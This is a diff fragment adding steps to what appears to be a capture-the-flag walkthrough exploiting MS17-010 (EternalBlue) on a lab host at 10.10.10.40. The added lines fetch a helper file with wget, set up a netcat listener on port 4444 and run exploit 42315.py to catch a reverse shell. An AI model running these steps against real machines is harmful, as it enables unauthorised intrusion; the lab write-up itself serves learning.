@@ -26,6 +26,16 @@ edit 42315.py files
 
 ![42315_PART_2](https://user-images.githubusercontent.com/55708909/91409465-103c1200-e863-11ea-8e7d-b6e316b7b6fb.png)
 
+Before running the exploit you need one more file that is mysmb.py files which you can get it from here
+
+wget https://raw.githubusercontent.com/helviojunior/MS17-010/master/mysmb.py
+
+now open a netcat session at port 4444 and run the exploit using these commands : python 42315.py 10.10.10.40
+
+Here we have a netcat session from target machine.
+
+
+
 
 
 
